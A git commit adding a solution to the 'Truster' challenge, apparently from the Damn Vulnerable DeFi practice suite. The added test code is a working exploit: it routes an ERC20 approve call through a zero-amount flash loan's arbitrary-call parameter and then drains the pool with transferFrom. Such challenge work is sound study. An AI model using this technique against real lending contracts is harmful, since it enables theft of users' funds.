3567927383b827544be12e147ea7463c824d20f4
GuillermoFairbairn <fairbairnguillermo@gmail.com>
2022-12-02 23:07:46 -0300

    {NEW} truster - 3rd challenge completed

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        //I use the free call to any address to set an approval to the attacker to transfer the funds on 
+        //behalf the pool on a different call
+
+        //Create data for transaction to approve transfer of funds on behalf of the attacker
+        let dataTx = this.token.interface.encodeFunctionData('approve(address,uint256)', [attacker.address, TOKENS_IN_POOL])
+        //Exceute dummy flashloan (I dont even care who receives the flash loan and the amount borrowed)
+        await this.pool.flashLoan(0, this.pool.address, this.token.address, dataTx)
+        let attackerTokenInstance = await this.token.connect(attacker)
+        //Use approved funds to transfer them to attacker on behalf of the pool
+        await attackerTokenInstance.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
